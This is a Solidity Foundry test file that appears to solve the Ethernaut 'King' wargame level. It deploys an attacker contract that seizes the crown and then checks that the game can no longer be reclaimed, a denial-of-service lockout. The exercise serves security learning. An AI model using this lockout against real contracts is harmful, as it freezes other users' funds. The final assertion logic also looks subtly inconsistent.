// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {King} from "../src/King.sol";
import {MaliciousKing} from "./MaliciousKing.t.sol";

contract KingTest is Test {
    King kingGame;
    MaliciousKing hacker;

    // ADD THIS SO THE TEST SCRIPT CAN RECEIVE REFUNDS FROM THE KING CONTRACT
    receive() external payable {}

    function setUp() public {
        // Give our test account some starting cash (10 Ether)
        vm.deal(address(this), 10 ether);

        // Deploy the King game with 1 Ether as the starting prize
        kingGame = new King{value: 1 ether}();

        // Deploy our attacker contract
        hacker = new MaliciousKing();
    }

    function testBreakTheGame() public {
        // Verify we are the initial king
        assertEq(kingGame._king(), address(this));

        // Find out how much the current prize is
        uint256 currentPrize = kingGame.prize();

        // Give the hacker contract enough ETH to beat the prize (prize + a little extra)
        uint256 attackValue = currentPrize + 0.1 ether;
        vm.deal(address(hacker), attackValue);

        // Launch the attack: hacker steals the crown
        hacker.attack{value: attackValue}(payable(address(kingGame)));

        // Verify the hacker is now offically the King
        assertEq(kingGame._king(), address(hacker));

        // Now, try to take the crown back from the hacker
        // This should fail because the hacker refuses the payout, locking the game forever!
        vm.expectRevert();

        // Someone else tries to pay a higher price to take the crown
        (bool success,) = address(kingGame).call{value: currentPrize + 0.5 ether}("");
        require(success, "Should have failed");
    }
}
